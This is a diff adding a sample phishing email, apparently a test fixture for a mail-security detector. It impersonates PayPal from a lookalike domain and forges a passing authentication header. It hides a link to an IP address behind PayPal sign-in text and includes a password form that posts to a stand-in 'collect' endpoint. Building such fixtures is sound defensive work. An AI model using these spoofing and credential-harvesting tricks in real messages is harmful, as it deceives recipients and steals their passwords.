@@ -1,0 +1,27 @@
+Authentication-Results: mx.receiver.test; spf=softfail smtp.mailfrom=paypa1-security.test; dkim=none; dmarc=fail header.from=paypa1-security.test
+Received: from mail.paypa1-security.test (mail.paypa1-security.test [198.51.100.7]) by mx.receiver.test; Tue, 3 Mar 2026 10:00:05 +0000
+Authentication-Results: mx.paypal.com; spf=pass; dkim=pass; dmarc=pass
+From: "PayPal Service" <service@paypa1-security.test>
+Reply-To: payments.team@gmail.com
+To: user@receiver.test
+Subject: Your account will be suspended
+Date: Tue, 3 Mar 2026 10:00:00 +0000
+Message-ID: <spoof-1@paypa1-security.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="outer"
+
+--outer
+Content-Type: text/html; charset=utf-8
+
+<html><body>
+<p>Dear user@receiver.test, unusual activity was found. Your account will be suspended within 24 hours.</p>
+<p>Verify your password immediately: <a href="http://198.51.100.7/paypal/login">https://www.paypal.com/signin</a></p>
+<form action="http://198.51.100.7/collect"><input type="password" name="pw"></form>
+<p>Short link: <a href="https://bit.ly/3xYz">details</a></p>
+</body></html>
+--outer
+Content-Type: text/html; name="invoice.html"
+Content-Disposition: attachment; filename="invoice.html"
+
+<html><body>fake invoice</body></html>
+--outer--
